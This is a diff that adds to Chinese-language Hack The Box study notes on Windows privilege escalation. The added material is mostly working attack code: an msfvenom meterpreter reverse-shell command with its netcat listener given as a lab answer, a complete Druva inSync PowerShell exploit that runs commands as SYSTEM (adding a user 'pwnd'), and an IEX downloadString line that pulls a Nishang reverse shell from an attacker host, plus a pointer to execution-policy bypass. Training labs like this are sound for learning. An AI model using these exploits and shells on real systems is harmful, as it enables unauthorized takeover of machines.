@@ -1025,7 +1025,7 @@ PS C:\htb> wmic qfe list brief
 PS C:\htb> Get-Hotfix
 ```
 
-CVE-2020-0668利用：
+[此](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)CVE-2020-0668利用：
 
 检查当前用户权限
 
@@ -1106,6 +1106,12 @@ exploit
 C:\htb> net start MozillaMaintenance 
 ```
 
+实验答案：
+
+1. msfvenom -p **windows/x64/meterpreter/shell_reverse_tcp** LHOST=10.10.16.3 LPORT=4447 -f exe > maintenanceservice.exe
+
+2. nc -lvvp 4447
+
 ## 5.4易受攻击的服务
 
 枚举已安装的程序
@@ -1131,6 +1137,45 @@ PS C:\htb> get-process -Id 3324
 ```powershell-session
 PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
 ```
+
+Druva inSync PowerShell PoC
+
+```powershell
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+我们试试用 [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1),在脚本文件底部加上以下内容（同时更改 IP 以匹配我们的地址和监听端口）：
+
+```shell-session
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 9443
+```
+
+修改 Druva inSync 漏洞利用 PoC 脚本中的 `$cmd` 变量，将我们的 PowerShell 反向 shell 下载到内存中。
+
+```powershell
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
+```
+
+最后，在攻击框上启动 `Netcat` 侦听器，并在目标主机上执行 PoC PowerShell 脚本（使用诸如 `Set-ExecutionPolicy Bypass -Scope Process` 的命令修改 [PowerShell 执行策略](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy)后）。如果一切按计划进行，我们将以 `SYSTEM` 权限恢复反向 shell 连接。
 
 ## 5.5 DLL注入
 
